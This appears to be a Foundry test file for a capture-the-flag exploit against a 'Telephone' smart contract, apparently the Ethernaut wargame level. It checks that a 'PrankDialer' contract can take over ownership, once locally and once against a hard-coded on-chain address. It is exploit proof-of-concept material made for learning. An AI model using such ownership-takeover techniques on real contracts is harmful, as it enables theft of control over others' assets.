// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "ds-test/test.sol";
import "../PrankDialer.sol";
import "../Telephone.sol";

interface Vm {
    function startPrank(address) external;
    function prank(address) external;
    function stopPrank() external;
}

contract ContractTest is DSTest {
    Vm vm = Vm(HEVM_ADDRESS);
    PrankDialer c;
    Telephone t;
    function setUp() public {
        c = new PrankDialer();
        t = new Telephone();
    }

    function testPwm() public {
        emit log_address(t.owner());
        vm.startPrank(address(0xdead));
        c.ring(address(t), address(0xdead));
        vm.stopPrank();
        emit log_address(t.owner());
        assertEq(t.owner(), address(0xdead));
    }

    function testPwnForked() public {
        address target = address(0x101F1886C8057e030c6CCB6ADEf0850350C69e38);
        (bool result, bytes memory response) = address(target).call(abi.encodeWithSignature("owner()"));
        address starting_owner = abi.decode(response, (address));
        emit log_address(starting_owner);
        c.ring(target, address(this));
        (result, response) = address(target).call(abi.encodeWithSignature("owner()"));
        address pwned_owner = abi.decode(response, (address));
        assertEq(pwned_owner, address(this));
    }
}
